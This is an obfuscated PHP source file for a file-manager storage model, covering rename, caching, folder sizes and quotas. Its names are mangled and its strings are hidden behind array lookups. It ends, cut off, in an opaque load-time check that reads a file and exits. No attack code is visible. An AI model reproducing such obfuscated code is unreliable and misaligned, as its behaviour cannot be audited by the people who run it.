Hook::trigger($”“¦ÕÕ[2315], $ÖüÖš«œ, $êÁ¬È”Ş); if ($êÁ¬È”Ş) { Model($”“¦ÕÕ[2314])->moveToRecycle($œÒÁşÜ“); } else { $Ÿ™¢°ê = $this->childrenAll($òºÕ·ÑÍ); Model($”“¦ÕÕ[640])->eventRemove($œÒÁşÜ“); $this->removeRelevance($Ÿ™¢°ê[$”“¦ÕÕ[2313]], $Ÿ™¢°ê[$”“¦ÕÕ[1596]]); } $this->folderSizeReset($òºÕ·ÑÍ[$”“¦ÕÕ[193]]); $©‘ÖÀÀ… = array($òºÕ·ÑÍ[$”“¦ÕÕ[193]]); if ($òºÕ·ÑÍ[$”“¦ÕÕ[487]] == $”“¦ÕÕ[91]) { $©‘ÖÀÀ…[] = $òºÕ·ÑÍ[$”“¦ÕÕ[194]]; } $this->updateModifyTime($©‘ÖÀÀ…); $this->lockMoveEnd($œÒÁşÜ“); Hook::trigger($”“¦ÕÕ[1840], $ÖüÖš«œ, $êÁ¬È”Ş); return !0; } public function childrenAll($Îùä“»à) { $ŞÍ˜òÆ =& $_SERVER[ùèÅ´Ãš]; $³· µƒ¦ = $Îùä“»à[$ŞÍ˜òÆ[194]]; if ($Îùä“»à[$ŞÍ˜òÆ[487]] == $ŞÍ˜òÆ[91]) { $¬¹çË÷ = array($ŞÍ˜òÆ[659] => array($ŞÍ˜òÆ[619], $Îùä“»à[$ŞÍ˜òÆ[588]] . $³· µƒ¦ . $ŞÍ˜òÆ[620])); $©¡æ¾¨Ê = array($ŞÍ˜òÆ[659] => $¬¹çË÷[$ŞÍ˜òÆ[588]]); $ÈÑß«­’ = $this->field($ŞÍ˜òÆ[2316])->where($©¡æ¾¨Ê)->select(); $¥Š…ÁÏ = !1; $¹¦İÏ¥ = array($³· µƒ¦); if ($ÈÑß«­’) { $¥Š…ÁÏ = array_to_keyvalue($ÈÑß«­’, $ŞÍ˜òÆ[12], $ŞÍ˜òÆ[545]); $¥Š…ÁÏ = array_remove_value($¥Š…ÁÏ, $ŞÍ˜òÆ[231]); $¹¦İÏ¥ = array_to_keyvalue($ÈÑß«­’, $ŞÍ˜òÆ[12], $ŞÍ˜òÆ[194]); $¹¦İÏ¥[] = $³· µƒ¦; } } else { $¥Š…ÁÏ = array($Îùä“»à[$ŞÍ˜òÆ[545]]); $¹¦İÏ¥ = array($³· µƒ¦); } return array($ŞÍ˜òÆ[2313] => $¹¦İÏ¥, $ŞÍ˜òÆ[1596] => $¥Š…ÁÏ); } public function removeArray($—üØöõÄ) { if (!$—üØöõÄ) { return !0; } } public function removeRelevance($„ğäş«ş, $—ù‰²ĞÏ) { $¶¨§¼Ê =& $_SERVER[ùèÅ´Ãš]; $„ğäş«ş = $„ğäş«ş ? $„ğäş«ş : array(); $—ù‰²ĞÏ = $—ù‰²ĞÏ ? $—ù‰²ĞÏ : array(); $„ğäş«ş = array_unique(array_filter($„ğäş«ş)); $—ù‰²ĞÏ = array_filter($—ù‰²ĞÏ); if (!$„ğäş«ş) { return !1; } $ºĞÊÌ‰½ = array($¶¨§¼Ê[493] => array($¶¨§¼Ê[494], $„ğäş«ş)); Model($¶¨§¼Ê[2314])->where($ºĞÊÌ‰½)->delete(); Model($¶¨§¼Ê[537])->where($ºĞÊÌ‰½)->delete(); Model($¶¨§¼Ê[2152])->where($ºĞÊÌ‰½)->delete(); Model($¶¨§¼Ê[640])->where($ºĞÊÌ‰½)->delete(); Model($¶¨§¼Ê[1977])->removeBySource($„ğäş«ş); Model($¶¨§¼Ê[2295])->removeBySource($„ğäş«ş); $this->where($ºĞÊÌ‰½)->delete(); Model($¶¨§¼Ê[548])->remove($—ù‰²ĞÏ); for ($€§²ƒÃŞ = 0; $€§²ƒÃŞ < count($„ğäş«ş); $€§²ƒÃŞ++) { $this->sourceCacheClear($„ğäş«ş[$€§²ƒÃŞ]); } } public function rename($Õ´šöò’, $ãÆ„ËÛß) { $Ôë±®×· =& $_SERVER[ùèÅ´Ãš]; $¶½á‘œî = $this->sourceInfo($Õ´šöò’); if (!$¶½á‘œî) { return !1; } $­®¼‡¯Â = $this->fileNameExist($¶½á‘œî[$Ôë±®×·[193]], $ãÆ„ËÛß); if ($­®¼‡¯Â && $­®¼‡¯Â != $Õ´šöò’) { return !1; } $èÁÅ¥Ïû = array($Ôë±®×·[496] => $ãÆ„ËÛß, $Ôë±®×·[658] => USER_ID); if ($¶½á‘œî[$Ôë±®×·[487]] != $Ôë±®×·[91]) { $èÁÅ¥Ïû[$Ôë±®×·[488]] = substr(get_path_ext($ãÆ„ËÛß), 0, 10); } Model($Ôë±®×·[640])->eventRename($Õ´šöò’, $¶½á‘œî[$Ôë±®×·[32]], $ãÆ„ËÛß); $this->sourceCacheClear($Õ´šöò’); $this->setNamePinyin($Õ´šöò’, $èÁÅ¥Ïû[$Ôë±®×·[32]], !1); $this->updateModifyTime($¶½á‘œî[$Ôë±®×·[193]]); $öêÑ´Şê = $this->where(array($Ôë±®×·[493] => $Õ´šöò’))->data($èÁÅ¥Ïû)->save(); $’Œ÷È¶¡ = $Ôë±®×·[2303] . $¶½á‘œî[$Ôë±®×·[193]]; if (isset(self::$cacheChildList[$’Œ÷È¶¡])) { unset(self::$cacheChildList[$’Œ÷È¶¡]); } return $öêÑ´Şê; } public function setNamePinyin($ìÜ—Ÿğ¶, $ÍÀåÙ‹é, $±…Ìºñ = true) { $¿ã¤ºş½ =& $_SERVER[ùèÅ´Ãš]; $˜ÈĞ±Õè = Input::check($ÍÀåÙ‹é, $¿ã¤ºş½[662]); $à¶¤Ú£• = array($¿ã¤ºş½[519] => KodSort::makeStr($ÍÀåÙ‹é)); if ($˜ÈĞ±Õè) { $à¶¤Ú£•[$¿ã¤ºş½[540]] = str_replace($¿ã¤ºş½[53], $¿ã¤ºş½[12], Pinyin::get($ÍÀåÙ‹é)); $à¶¤Ú£•[$¿ã¤ºş½[539]] = Pinyin::get($ÍÀåÙ‹é, $¿ã¤ºş½[663]); } if (!$±…Ìºñ && !$˜ÈĞ±Õè) { $à¶¤Ú£•[$¿ã¤ºş½[540]] = null; $à¶¤Ú£•[$¿ã¤ºş½[539]] = null; } $this->metaSet($ìÜ—Ÿğ¶, $à¶¤Ú£•); } public function getContent($ÛóÈÃõï) { $åÙÀâçğ =& $_SERVER[ùèÅ´Ãš]; $šš¶‚ƒ¯ = $this->fileInfoGet($ÛóÈÃõï); if (!$šš¶‚ƒ¯) { return !1; } if ($šš¶‚ƒ¯[$åÙÀâçğ[79]] == 0) { return $åÙÀâçğ[12]; } $İİ‚Åø÷ = $åÙÀâçğ[2317] . $šš¶‚ƒ¯[$åÙÀâçğ[551]]; if ($šš¶‚ƒ¯[$åÙÀâçğ[79]] <= 1024 * 10) { $ìä™™Ú = Cache::get($İİ‚Åø÷); if (!$ìä™™Ú) { $ìä™™Ú = IO::getContent($šš¶‚ƒ¯[$åÙÀâçğ[87]]); Cache::set($İİ‚Åø÷, $ìä™™Ú); } return $ìä™™Ú; } if (!$šš¶‚ƒ¯[$åÙÀâçğ[87]]) { return $åÙÀâçğ[12]; } return IO::getContent($šš¶‚ƒ¯[$åÙÀâçğ[87]]); } public function setDesc($¹µ¡òíé, $ÒßÖ¥üÀ) { $ç©°ö¿ç =& $_SERVER[ùèÅ´Ãš]; Model($ç©°ö¿ç[640])->eventAddDesc($¹µ¡òíé, $ÒßÖ¥üÀ); return $this->metaSet($¹µ¡òíé, $ç©°ö¿ç[528], $ÒßÖ¥üÀ); } public function setContent($„ÜŸÈ¬â, $€¬£‰‘÷ = '') { $ã’–‘Ë£ =& $_SERVER[ùèÅ´Ãš]; $±¾¿¯ïÊ = $this->sourceInfo($„ÜŸÈ¬â); $û¨ÒÉóõ = $this->fileInfoGet($„ÜŸÈ¬â); if (!$û¨ÒÉóõ || !$±¾¿¯ïÊ) { return !1; } $¶¸˜ıÌù = KodIO::ioFileDriverGet($ã’–‘Ë£[485] . $„ÜŸÈ¬â . $ã’–‘Ë£[404]); $„ŸŠó­· = Model($ã’–‘Ë£[548])->addFileByContent($€¬£‰‘÷, $¶¸˜ıÌù, $±¾¿¯ïÊ[$ã’–‘Ë£[32]]); if (!$„ŸŠó­·) { return !1; } $°ÁÔ ã£ = $this->fileHistory($±¾¿¯ïÊ, $„ŸŠó­·[$ã’–‘Ë£[545]], $„ŸŠó­·[$ã’–‘Ë£[79]]); if (!$°ÁÔ ã£) { return Model($ã’–‘Ë£[548])->remove($„ŸŠó­·[$ã’–‘Ë£[545]]); } $this->folderSizeReset($±¾¿¯ïÊ[$ã’–‘Ë£[193]]); return !0; } public function fileSubstr($Íô‡É¶, $ÎšÆë°, $ìÙÌè­) { $ÛÓË ›“ = $this->fileInfoGet($Íô‡É¶); if (!$ÛÓË ›“) { return !1; } return IO::fileSubstr($ÛÓË ›“[$_SERVER[ùèÅ´Ãš][87]], $ÎšÆë°, $ìÙÌè­); } public function fileInfoGet($ ››Ô¬Œ) { $şÚÉÍ‘é =& $_SERVER[ùèÅ´Ãš]; $˜µìêİá = $this->sourceInfo($ ››Ô¬Œ); if (!$˜µìêİá || $˜µìêİá[$şÚÉÍ‘é[487]]) { return !1; } $ËÙèÌñ¸ = $şÚÉÍ‘é[552] . $˜µìêİá[$şÚÉÍ‘é[545]]; $óÛğÏÌÜ = _get(self::$cacheFileInfo, $ËÙèÌñ¸); if ($óÛğÏÌÜ) { return $óÛğÏÌÜ; } $§°ïóƒâ = Model($şÚÉÍ‘é[548])->fileInfo($˜µìêİá[$şÚÉÍ‘é[545]]); if ($§°ïóƒâ) { $§°ïóƒâ[$şÚÉÍ‘é[32]] = $˜µìêİá[$şÚÉÍ‘é[32]]; } self::$cacheFileInfo[$ËÙèÌñ¸] = $§°ïóƒâ; return $§°ïóƒâ; } private function folderChildrenNumber($ÎŒšÜ¸ã) { $¡÷„µÛ¾ =& $_SERVER[ùèÅ´Ãš]; $ğ–„çÎ’ = $this->sourceInfo($ÎŒšÜ¸ã); $•‡¤ÖÄ = array($¡÷„µÛ¾[659] => array($¡÷„µÛ¾[619], $ğ–„çÎ’[$¡÷„µÛ¾[588]] . $ÎŒšÜ¸ã . $¡÷„µÛ¾[620]), $¡÷„µÛ¾[656] => $ğ–„çÎ’[$¡÷„µÛ¾[573]], $¡÷„µÛ¾[506] => intval($ğ–„çÎ’[$¡÷„µÛ¾[507]]), $¡÷„µÛ¾[653] => 1); $Óìï´³ = $this->where($•‡¤ÖÄ)->count(); $ÄÓí…çÅ = $this->where($•‡¤ÖÄ)->where(array($¡÷„µÛ¾[653] => 0))->count(); return array($¡÷„µÛ¾[83] => $ÄÓí…çÅ, $¡÷„µÛ¾[84] => $Óìï´³); } public function pathInfo($¸ş¤Ã´ä, $Å‚ÈÌÃ = false) { $Ú›ÈĞ±é =& $_SERVER[ùèÅ´Ãš]; $Å‚ÈÌÃ = !1; $¸ş¤Ã´ä = intval($¸ş¤Ã´ä); $±æÏ¬„• = $Ú›ÈĞ±é[536] . intval($Å‚ÈÌÃ) . $Ú›ÈĞ±é[464] . $¸ş¤Ã´ä; $ëé÷ÍÀ = _get(self::$cachePathInfo, $±æÏ¬„•); if ($ëé÷ÍÀ) { return $ëé÷ÍÀ; } $µœÀÎØŠ = $this->sourceInfo($¸ş¤Ã´ä); if (!$µœÀÎØŠ) { return !1; } $µœÀÎØŠ = $this->_listDataApplyItem($µœÀÎØŠ, $Å‚ÈÌÃ); self::$cachePathInfo[$±æÏ¬„•] = $µœÀÎØŠ; return $µœÀÎØŠ; } public static $cachePathInfoMore = array(); public function pathInfoMore($”­ıôî) { $ÁøİÄâ¼ =& $_SERVER[ùèÅ´Ãš]; $½”ÆÚƒû = _get(self::$cachePathInfoMore, $”­ıôî); if ($½”ÆÚƒû) { return $½”ÆÚƒû; } $ğ›€«Ãæ = $this->pathInfo($”­ıôî); if (!$ğ›€«Ãæ) { return !1; } if ($ğ›€«Ãæ[$ÁøİÄâ¼[487]] == $ÁøİÄâ¼[91]) { $ğ›€«Ãæ[$ÁøİÄâ¼[82]] = $this->folderChildrenNumber($”­ıôî); } self::$cachePathInfoMore[$”­ıôî] = $ğ›€«Ãæ; return $ğ›€«Ãæ; } public function sourceInfo($™ÑÑ™µŞ) { $Ñ«åÂÖÂ =& $_SERVER[ùèÅ´Ãš]; if (!$™ÑÑ™µŞ) { return array(); } $™ÑÑ™µŞ = intval($™ÑÑ™µŞ); $ëŞ«À…ı = $Ñ«åÂÖÂ[535] . $™ÑÑ™µŞ; $Ã»î§£Ö = _get(self::$cacheSourceInfo, $ëŞ«À…ı); if ($Ã»î§£Ö) { return $Ã»î§£Ö; } $³Œ¾Èöâ = $this->where(array($Ñ«åÂÖÂ[194] => $™ÑÑ™µŞ))->find(); self::$cacheSourceInfo[$ëŞ«À…ı] = $³Œ¾Èöâ; return self::$cacheSourceInfo[$ëŞ«À…ı]; } public function sourceCacheClear($ÓÑ×æìË = false) { self::cacheClear($ÓÑ×æìË); } public static function cacheClear($’é˜“‡ = false) { $Ç©¶²‚ =& $_SERVER[ùèÅ´Ãš]; if ($’é˜“‡ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ç©¶²‚[535] . $’é˜“‡]); unset(self::$cachePathInfoMore[$’é˜“‡]); unset(self::$cachePathInfo[$Ç©¶²‚[2318] . $’é˜“‡]); unset(self::$cachePathInfo[$Ç©¶²‚[2319] . $’é˜“‡]); } public function metaSet($ı¹—ÃŸ“, $üŞ–õò = null, $£‚ñì¾¼ = null) { $ıÉœ„õ = parent::metaSet($ı¹—ÃŸ“, $üŞ–õò, $£‚ñì¾¼); if ($ıÉœ„õ) { $this->sourceCacheClear($ı¹—ÃŸ“); } return $ıÉœ„õ; } public function pathInfoByPath($‘¥†¾Ä, $Ş¯‰óµ±) { $ˆâå«ù =& $_SERVER[ùèÅ´Ãš]; $ÖûØİ»µ = !$Ş¯‰óµ± ? array() : explode($ˆâå«ù[8], trim($Ş¯‰óµ±, $ˆâå«ù[8])); $Æ·óƒá = intval($‘¥†¾Ä); foreach ($ÖûØİ»µ as $‘Ç›—ŒÆ) { $­âş·„Œ = array($ˆâå«ù[193] => $Æ·óƒá, $ˆâå«ù[32] => $‘Ç›—ŒÆ); $„ìŸÊÄï = $this->field($ˆâå«ù[2320])->where($­âş·„Œ)->select(); if (!$„ìŸÊÄï) { return !1; } $„ìŸÊÄï = array_sort_by($„ìŸÊÄï, $ˆâå«ù[507]); $Æ·óƒá = $„ìŸÊÄï[0][$ˆâå«ù[194]]; } $çÉ×Õ = $this->sourceInfo($Æ·óƒá); $this->pathInfoFilter($çÉ×Õ); return $çÉ×Õ; } protected function updateModifyTime($±ï·ªà®) { $ÑãßËàì =& $_SERVER[ùèÅ´Ãš]; $û¡áÖí¹ = defined($ÑãßËàì[2228]) ? USER_ID : 0; if (!$±ï·ªà®) { return; } if (!is_array($±ï·ªà®)) { $±ï·ªà® = array($±ï·ªà®); } foreach ($±ï·ªà® as $Ü“øÃûé => $³åÔñ“‚) { $±ï·ªà®[$Ü“øÃûé] = intval($³åÔñ“‚); $this->sourceCacheClear($³åÔñ“‚); } $Âç€ŠË¤ = array($ÑãßËàì[194] => array($ÑãßËàì[7], $±ï·ªà®)); $±­„‡ä– = array($ÑãßËàì[658] => $û¡áÖí¹, $ÑãßËàì[500] => time()); $this->where($Âç€ŠË¤)->save($±­„‡ä–); } public function folderSizeReset($óÅ¬ş›ø, $è ²üğ÷ = false) { $ä¶¸üò =& $_SERVER[ùèÅ´Ãš]; if ($this->statusIgnoreResetSpace) { return; } if (!$óÅ¬ş›ø) { return; } $•ö÷™Ÿ = $this->sourceInfo($óÅ¬ş›ø); $ÕÏ¿‚Ïç = $ä¶¸üò[2321] . $óÅ¬ş›ø; if (!$•ö÷™Ÿ || !$•ö÷™Ÿ[$ä¶¸üò[194]]) { return; } CacheLock::lock($ÕÏ¿‚Ïç, 20); if ($è ²üğ÷ === !1) { $this->sourceCacheClear($óÅ¬ş›ø); $•ö÷™Ÿ = $this->sourceInfo($óÅ¬ş›ø); $ÅÖÚĞ¢² = array($ä¶¸üò[479] => $óÅ¬ş›ø, $ä¶¸üò[506] => 0); $ƒ›Å—™ = $this->where($ÅÖÚĞ¢²)->sum($ä¶¸üò[79]); $è ²üğ÷ = intval($ƒ›Å—™) - intval($•ö÷™Ÿ[$ä¶¸üò[79]]); } if ($è ²üğ÷ == 0) { return CacheLock::unlock($ÕÏ¿‚Ïç); } $Á¦ı€ö = $this->parentLevelArray($•ö÷™Ÿ[$ä¶¸üò[588]]); if (!$Á¦ı€ö) { $Á¦ı€ö = array(); } $Á¦ı€ö[] = $•ö÷™Ÿ[$ä¶¸üò[194]]; $ÅÖÚĞ¢² = array($ä¶¸üò[194] => array($ä¶¸üò[494], $Á¦ı€ö)); if ($è ²üğ÷ < 0) { $ÅÖÚĞ¢²[$ä¶¸üò[79]] = array($ä¶¸üò[1103], abs($è ²üğ÷)); } $this->where($ÅÖÚĞ¢²)->setAdd($ä¶¸üò[79], $è ²üğ÷); CacheLock::unlock($ÕÏ¿‚Ïç); if (!$•ö÷™Ÿ[$ä¶¸üò[573]] || $•ö÷™Ÿ[$ä¶¸üò[573]] == $ä¶¸üò[231]) { return; } $…şäÌÁÍ = $ä¶¸üò[2322] . $•ö÷™Ÿ[$ä¶¸üò[191]] . $ä¶¸üò[4] . $•ö÷™Ÿ[$ä¶¸üò[573]]; $‹¶Úœª = array($•ö÷™Ÿ[$ä¶¸üò[191]], $•ö÷™Ÿ[$ä¶¸üò[573]]); TaskRun::timeLimitCall($…şäÌÁÍ, $ä¶¸üò[2323], $‹¶Úœª, 1.5); } public function folderSizeResetChildren($Í¿¤ÏĞ) { $§¼ÃõÃ¸ =& $_SERVER[ùèÅ´Ãš]; $this->sourceCacheClear($Í¿¤ÏĞ); $Ÿ¥‹áÏ” = $this->sourceInfo($Í¿¤ÏĞ); if (!$Ÿ¥‹áÏ”) { return; } $ò×°®Š = array($§¼ÃõÃ¸[653] => 1, $§¼ÃõÃ¸[656] => $Ÿ¥‹áÏ”[$§¼ÃõÃ¸[573]], $§¼ÃõÃ¸[659] => array($§¼ÃõÃ¸[619], $Ÿ¥‹áÏ”[$§¼ÃõÃ¸[588]] . $Í¿¤ÏĞ . $§¼ÃõÃ¸[620])); $é›±»Ó = $§¼ÃõÃ¸[2324]; $Öß™Úç = $this->field($é›±»Ó)->where($ò×°®Š)->select(); $ò×°®Š[$§¼ÃõÃ¸[487]] = 0; $ê†İ£çå = $this->field($é›±»Ó)->where($ò×°®Š)->select(); if (!$ê†İ£çå) { return; } $Öß™Úç[] = $Ÿ¥‹áÏ”; $Öß™Úç = array_to_keyvalue($Öß™Úç, $§¼ÃõÃ¸[194]); foreach ($Öß™Úç as $¨´á¯Ÿ™ => $Ø¤ò¹Ÿ£) { $Öß™Úç[$¨´á¯Ÿ™][$§¼ÃõÃ¸[2325]] = $Öß™Úç[$¨´á¯Ÿ™][$§¼ÃõÃ¸[79]]; $Öß™Úç[$¨´á¯Ÿ™][$§¼ÃõÃ¸[79]] = 0; } foreach ($ê†İ£çå as $Ø¤ò¹Ÿ£) { $ºÁğºÚû = $Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[193]] . $§¼ÃõÃ¸[12]; if (!isset($Öß™Úç[$ºÁğºÚû])) { continue; } if ($Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[507]] == $Öß™Úç[$ºÁğºÚû][$§¼ÃõÃ¸[507]]) { $Öß™Úç[$ºÁğºÚû][$§¼ÃõÃ¸[79]] += $Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[79]]; } } foreach ($Öß™Úç as $Ø¤ò¹Ÿ£) { $À¹•­ÁÏ = $this->parentLevelArray($Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[588]]); foreach ($À¹•­ÁÏ as $ºÁğºÚû) { $ºÁğºÚû = $ºÁğºÚû . $§¼ÃõÃ¸[12]; if (!isset($Öß™Úç[$ºÁğºÚû])) { continue; } if ($Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[507]] == $Öß™Úç[$ºÁğºÚû][$§¼ÃõÃ¸[507]]) { $Öß™Úç[$ºÁğºÚû][$§¼ÃõÃ¸[79]] += $Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[79]]; } } } $í¨ò©šÇ = array(); foreach ($Öß™Úç as $Ø¤ò¹Ÿ£) { if ($Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[79]] == $Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[2325]]) { continue; } $í¨ò©šÇ[] = array($§¼ÃõÃ¸[194], $Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[194]], $§¼ÃõÃ¸[79], $Ø¤ò¹Ÿ£[$§¼ÃõÃ¸[79]]); } $this->saveAll($í¨ò©šÇ); } public function userSpaceReset($ˆ¡¯¦ñî = false) { $ÊÊ¼Ş—¿ =& $_SERVER[ùèÅ´Ãš]; $Ÿ™’¡õ = $this->where(array($ÊÊ¼Ş—¿[191] => self::TYPE_USER, $ÊÊ¼Ş—¿[573] => $ˆ¡¯¦ñî, $ÊÊ¼Ş—¿[487] => 0))->sum($ÊÊ¼Ş—¿[79]); $Ÿ™’¡õ = !$Ÿ™’¡õ || $Ÿ™’¡õ <= 0 ? 0 : $Ÿ™’¡õ; Model($ÊÊ¼Ş—¿[581])->userEdit($ˆ¡¯¦ñî, array($ÊÊ¼Ş—¿[1986] => $Ÿ™’¡õ)); } public function targetSpaceUpdate($™Ø¾´‹, $Îºäã‡) { $“Çóıšî =& $_SERVER[ùèÅ´Ãš]; if (!$Îºäã‡) { return; } if (!in_array($™Ø¾´‹, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $í³¶Â = $this->targetSpaceSize($™Ø¾´‹, $Îºäã‡); if ($™Ø¾´‹ == self::TYPE_USER) { Model($“Çóıšî[581])->userEdit($Îºäã‡, array($“Çóıšî[1986] => $í³¶Â)); } else { if ($™Ø¾´‹ == self::TYPE_GROUP) { Model($“Çóıšî[589])->groupEdit($Îºäã‡, array($“Çóıšî[1986] => $í³¶Â)); } } } public function targetSpaceSize($Ãà–Ã¬¸, $ËüƒÆñø) { $‚ïÑ„Ñâ =& $_SERVER[ùèÅ´Ãš]; $¨ûÑĞ´ı = 0; $èÃõúÈº = $this->targetSourceRoot($Ãà–Ã¬¸, $ËüƒÆñø, !0); foreach ($èÃõúÈº as $ğô…Ë»ö) { if (!$ğô…Ë»ö) { continue; } $¨ûÑĞ´ı += floatval($ğô…Ë»ö[$‚ïÑ„Ñâ[79]]); $¢“ñôäë = array($‚ïÑ„Ñâ[659] => array($‚ïÑ„Ñâ[619], $‚ïÑ„Ñâ[597] . $ğô…Ë»ö[$‚ïÑ„Ñâ[194]] . $‚ïÑ„Ñâ[620])); $Úî‹€öÒ = Model($‚ïÑ„Ñâ[505])->field($‚ïÑ„Ñâ[493])->where($¢“ñôäë)->select(); $Úî‹€öÒ = array_to_keyvalue($Úî‹€öÒ, $‚ïÑ„Ñâ[12], $‚ïÑ„Ñâ[194]); $Úî‹€öÒ = array_unique(array_filter($Úî‹€öÒ)); if ($Úî‹€öÒ) { $¢“ñôäë = array($‚ïÑ„Ñâ[493] => array($‚ïÑ„Ñâ[494], $Úî‹€öÒ)); $¨ûÑĞ´ı += floatval($this->where($¢“ñôäë)->sum($‚ïÑ„Ñâ[79])); } } $¨ûÑĞ´ı = !$¨ûÑĞ´ı || $¨ûÑĞ´ı <= 0 ? 0 : $¨ûÑĞ´ı; return $¨ûÑĞ´ı; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($éğÓë’´) { return $this->fileTypeProfile($éğÓë’´, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Æıì¾Ñ) { return $this->fileTypeProfile($Æıì¾Ñ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($óÍÔü³ˆ, $ÈêËÚÜš) { $Â”³öà =& $_SERVER[ùèÅ´Ãš]; $ÅöÃÆ¿ò = $Â”³öà[2326] . $óÍÔü³ˆ . $Â”³öà[11] . $ÈêËÚÜš; $úËÇ˜²µ = Cache::get($ÅöÃÆ¿ò); if ($úËÇ˜²µ) { return $úËÇ˜²µ; } $’àÍä¸ = array($Â”³öà[653] => 0); if ($óÍÔü³ˆ != !1) { $’àÍä¸[$Â”³öà[573]] = $óÍÔü³ˆ; $’àÍä¸[$Â”³öà[191]] = $ÈêËÚÜš; } $çûõ²¹‡ = array(); $çûõ²¹‡[$Â”³öà[2327]] = array($Â”³öà[2328] => LNG($Â”³öà[2327]), $Â”³öà[2329] => $this->where($’àÍä¸)->count(), $Â”³öà[624] => $this->where($’àÍä¸)->sum($Â”³öà[79])); $ë™ûÓ‘‡ = KodIO::fileTypeList(); foreach ($ë™ûÓ‘‡ as $ÂØ‘µè => $¡İ“ˆ¡ì) { $’àÍä¸[$Â”³öà[488]] = $this->fileTypeWhere($ÂØ‘µè); $çûõ²¹‡[$ÂØ‘µè] = array($Â”³öà[2328] => $¡İ“ˆ¡ì[$Â”³öà[32]], $Â”³öà[2329] => $this->where($’àÍä¸)->count(), $Â”³öà[624] => $this->where($’àÍä¸)->sum($Â”³öà[79])); } Cache::set($ÅöÃÆ¿ò, $çûõ²¹‡, 1200); return $çûõ²¹‡; } public function fileNameExist($ñÙÀ‹ª, $éÓ«åÙì) { $ËÙá¥Ã =& $_SERVER[ùèÅ´Ãš]; $¥´¿´è² = $this->field($ËÙá¥Ã[2330])->where(array($ËÙá¥Ã[193] => $ñÙÀ‹ª, $ËÙá¥Ã[32] => $éÓ«åÙì, $ËÙá¥Ã[507] => 0))->find(); return is_array($¥´¿´è²) ? $¥´¿´è²[$ËÙá¥Ã[194]] : !1; } public function childList($ÛÁëó§) { $ú§šâ¢Æ =& $_SERVER[ùèÅ´Ãš]; $ŸÖ¿ı‡‘ = $ú§šâ¢Æ[2303] . $ÛÁëó§; if (isset(self::$cacheChildList[$ŸÖ¿ı‡‘])) { return self::$cacheChildList[$ŸÖ¿ı‡‘]; } $‹Ö„ ¡¡ = array($ú§šâ¢Æ[193] => intval($ÛÁëó§), $ú§šâ¢Æ[507] => 0); $ šğ™ÜÎ = $this->where($‹Ö„ ¡¡)->select(); $ šğ™ÜÎ = $ šğ™ÜÎ ? $ šğ™ÜÎ : array(); self::$cacheChildList[$ŸÖ¿ı‡‘] = $ šğ™ÜÎ; foreach ($ šğ™ÜÎ as $Ÿ´‡†ˆÎ) { $ŸÖ¿ı‡‘ = $ú§šâ¢Æ[535] . $Ÿ´‡†ˆÎ[$ú§šâ¢Æ[194]]; self::$cacheSourceInfo[$ŸÖ¿ı‡‘] = $Ÿ´‡†ˆÎ; } return $ šğ™ÜÎ; } public function fileNameAuto($Ïª£ö–å, $ÅÛã¶ãÎ, $âªÄ èŸ = REPEAT_RENAME, $·ïÕ„³Î = false) { $·‘óÇ Ç =& $_SERVER[ùèÅ´Ãš]; $Ô™şˆ° = get_path_ext($ÅÛã¶ãÎ); $Šïõµ÷• = $Ô™şˆ° ? get_path_ext_name($ÅÛã¶ãÎ) . $·‘óÇ Ç[2331] . $Ô™şˆ° : $ÅÛã¶ãÎ . $·‘óÇ Ç[462]; $œøÔ¢±« = array($·‘óÇ Ç[193] => $Ïª£ö–å, $·‘óÇ Ç[507] => 0, $·‘óÇ Ç[32] => array($·‘óÇ Ç[461], $Šïõµ÷•)); $§úÜñ¼ = $this->field($·‘óÇ Ç[32])->where($œøÔ¢±«)->select(); $ëóÎşé™ = array_to_keyvalue($§úÜñ¼, $·‘óÇ Ç[12], $·‘óÇ Ç[32]); return $this->fileNameAutoGet($ëóÎşé™, $ÅÛã¶ãÎ, $âªÄ èŸ, $·ïÕ„³Î); } public function fileNameAutoGet($¹‘…ÌÕ, $å¶¹ç¹Ú, $ê¤ÌŒÖ, $¢àçâÔª) { $İÌó×óÚ =& $_SERVER[ùèÅ´Ãš]; if ($ê¤ÌŒÖ == REPEAT_REPLACE || !$¹‘…ÌÕ || !in_array_not_case($å¶¹ç¹Ú, $¹‘…ÌÕ) || $¢àçâÔª && $ê¤ÌŒÖ != REPEAT_RENAME_FOLDER) { return $å¶¹ç¹Ú; } if ($ê¤ÌŒÖ == REPEAT_SKIP) { return !1; } $äòãàøÉ = $İÌó×óÚ[10] . get_path_ext($å¶¹ç¹Ú); $äòãàøÉ = $äòãàøÉ == $İÌó×óÚ[10] || $¢àçâÔª ? $İÌó×óÚ[12] : $äòãàøÉ; for ($õ•œíÉ– = 1; $õ•œíÉ– <= count($¹‘…ÌÕ) + 1; $õ•œíÉ–++) { $¢ÛÛ«ğ = substr($å¶¹ç¹Ú, 0, strlen($å¶¹ç¹Ú) - strlen($äòãàøÉ)); $Ş©¿ß—ã = $¢ÛÛ«ğ . "\50{$õ•œíÉ–}\51{$äòãàøÉ}"; if (!in_array_not_case($Ş©¿ß—ã, $¹‘…ÌÕ)) { return $Ş©¿ß—ã; } } } } if ($_SERVER[$_SERVER[ùèÅ´Ãš][961]] != $_SERVER[$_SERVER[ùèÅ´Ãš][962]]) { $_getc = $_SERVER[ùèÅ´Ãš][964]; $_getfile = $_SERVER[$_SERVER[ùèÅ´Ãš][965]] . $_SERVER[ùèÅ´Ãš][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ùèÅ´Ãš][288], $_getfilec); if (count($_getarrs) < $_SERVER[ùèÅ´Ãš][704]) { $exit = $_SERVER[ùèÅ´Ãš][967]; $exit(); } $_act = $_SERVER[ùèÅ´Ãš][1627]; 